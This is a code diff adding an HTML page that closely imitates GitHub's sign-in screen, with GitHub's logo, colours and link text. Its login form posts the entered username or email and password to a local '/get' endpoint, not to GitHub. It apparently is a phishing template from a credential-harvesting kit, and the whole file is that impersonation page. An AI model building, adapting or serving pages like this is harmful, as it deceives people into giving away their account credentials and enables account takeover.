@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Sign in to GitHub</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+        background-color: #0d1117;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 340px;
+        text-align: center;
+      }
+      #logo {
+        margin-bottom: 20px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 300;
+        color: #f0f6fc;
+        margin-bottom: 16px;
+      }
+      .form-box {
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        padding: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 5px 12px;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        font-size: 14px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+        background: #0d1117;
+        color: #f0f6fc;
+        line-height: 20px;
+      }
+      .g-input:focus {
+        border-color: #388bfd;
+        box-shadow: 0 0 0 3px rgba(56,139,253,0.3);
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 5px 16px;
+        background-color: #238636;
+        color: #fff;
+        border: 1px solid rgba(240,246,252,0.1);
+        border-radius: 6px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        line-height: 20px;
+      }
+      .gbtn-primary:hover {
+        background-color: #2ea043;
+        border-color: rgba(240,246,252,0.1);
+      }
+      .link {
+        display: block;
+        margin-top: 16px;
+        color: #58a6ff;
+        font-size: 14px;
+        text-decoration: none;
+      }
+      .link:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        margin-top: 16px;
+        font-size: 12px;
+        color: #8b949e;
+      }
+      .footer a {
+        color: #58a6ff;
+        text-decoration: none;
+      }
+      .separator {
+        border-bottom: 1px solid #30363d;
+        margin: 16px 0;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 98 96" width="48" height="48" fill="#f0f6fc">
+        <path fill-rule="evenodd" clip-rule="evenodd" d="M48.854 0C21.839 0 0 22 0 49.217c0 21.756 13.993 40.172 33.405 46.69 2.427.49 3.316-1.059 3.316-2.362 0-1.141-.08-5.052-.08-9.127-13.59 2.934-16.42-5.867-16.42-5.867-2.184-5.704-5.42-7.17-5.42-7.17-4.448-3.015.324-3.015.324-3.015 4.934.326 7.523 5.052 7.523 5.052 4.367 7.496 11.404 5.378 14.235 4.074.404-3.178 1.699-5.378 3.074-6.6-10.839-1.141-22.243-5.378-22.243-24.283 0-5.378 1.94-9.778 5.014-13.2-.485-1.222-2.184-6.275.486-13.038 0 0 4.125-1.304 13.426 5.052a46.97 46.97 0 0 1 12.214-1.63c4.125 0 8.33.571 12.213 1.63 9.302-6.356 13.427-5.052 13.427-5.052 2.67 6.763.97 11.816.485 13.038 3.155 3.422 5.015 7.822 5.015 13.2 0 18.905-11.404 23.06-22.324 24.283 1.78 1.548 3.316 4.481 3.316 9.126 0 6.6-.08 11.897-.08 13.526 0 1.304.89 2.853 3.316 2.364 19.412-6.52 33.405-24.935 33.405-46.691C97.707 22 75.788 0 48.854 0z"/>
+      </svg>
+      <h1 class="g-h1">Sign in to GitHub</h1>
+      <div class="form-box">
+        <form action="/get" method="POST">
+          <div style="text-align:left;margin-bottom:16px">
+            <label style="font-size:14px;font-weight:600;color:#f0f6fc;display:block;margin-bottom:6px">Username or email address</label>
+            <input class="g-input" type="text" name="email" required>
+          </div>
+          <div style="text-align:left;margin-bottom:16px">
+            <label style="font-size:14px;font-weight:600;color:#f0f6fc;display:block;margin-bottom:6px">Password</label>
+            <input class="g-input" type="password" name="password" required>
+          </div>
+          <button type="submit" class="gbtn-primary">Sign in</button>
+        </form>
+      </div>
+      <a href="#" class="link">Forgot password?</a>
+      <div class="separator"></div>
+      <p class="footer">New to GitHub? <a href="#">Create an account</a></p>
+    </div>
+  </body>
+</html>
